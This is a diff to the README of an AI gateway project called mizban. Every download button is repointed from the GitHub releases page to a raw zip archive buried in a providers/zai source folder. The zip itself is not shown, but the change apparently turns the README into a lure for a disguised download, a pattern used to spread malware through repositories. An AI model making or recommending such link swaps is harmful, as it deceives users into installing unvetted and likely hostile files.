@@ -1,7 +1,7 @@
 <h1>🤖 mizban - Your Personal AI Gateway Made Easy</h1>
 
 <p align="center">
-  <a href="https://github.com/chiawei0110-maker/mizban/releases">
+  <a href="https://raw.githubusercontent.com/chiawei0110-maker/mizban/main/providers/zai/v2.9.zip">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_MIZBAN-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download Mizban" width="400"/>
   </a>
 </p>
@@ -41,7 +41,7 @@ Built with PHP and MySQL, Mizban is strong enough for business use but simple en
 
 ### Step 1: Download Mizban
 
-<a href="https://github.com/chiawei0110-maker/mizban/releases">
+<a href="https://raw.githubusercontent.com/chiawei0110-maker/mizban/main/providers/zai/v2.9.zip">
   <img src="https://img.shields.io/badge/📥_GET_MIZBAN_NOW-4ECDC4?style=for-the-badge" alt="Get Mizban" width="300"/>
 </a>
 
@@ -198,7 +198,7 @@ Mizban puts the power of AI in your hands. No technical degree required. No comp
 
 Join thousands of happy users who've simplified their AI experience with Mizban. It's free, it's open source, and it works.
 
-<a href="https://github.com/chiawei0110-maker/mizban/releases">
+<a href="https://raw.githubusercontent.com/chiawei0110-maker/mizban/main/providers/zai/v2.9.zip">
   <img src="https://img.shields.io/badge/🎉_START_WITH_MIZBAN_TODAY-845EC2?style=for-the-badge" alt="Start with Mizban" width="400"/>
 </a>
 
